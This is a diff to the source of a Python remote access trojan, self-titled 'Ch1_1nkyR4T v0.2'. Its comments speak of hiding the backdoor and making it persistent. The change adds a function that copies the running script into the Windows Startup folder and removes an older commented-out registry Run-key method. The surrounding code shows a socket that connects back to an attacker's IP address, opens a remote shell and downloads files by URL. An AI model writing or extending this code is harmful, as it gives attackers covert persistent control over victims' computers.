@@ -1,5 +1,6 @@
 ## Ch1_1nkyR4T v0.2 | by d0t
 
+from sys import argv
 import socket
 import subprocess
 import json
@@ -14,12 +15,19 @@ import requests
 ##hiding backdoor and creating persistent
 ##copy backdoor 'Appdata' in case of windows only in linux dist it doesnt exist change accordingly
 
-'''
+
 location = os.environ("appdata") + "\\" + "windows32.exe"
-if not os.path.exists(location):
-    shutil.copyfile(sys.executable ,location)
-    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"' + location + '"' + shell=True)
-'''
+
+roaming = os.getenv("appdata")
+startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+
+def startup():
+    try:
+        shutil.copy2(argv[0], startup_loc)
+    except Exception:
+        pass
+
+
 
 sock_object = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 ##should be the public ip of the attackers machine
@@ -33,6 +41,7 @@ def connect_back():
             shell()
         except:
             connect_back()
+
 
 def download(url):
     get_response = requests.get(url)
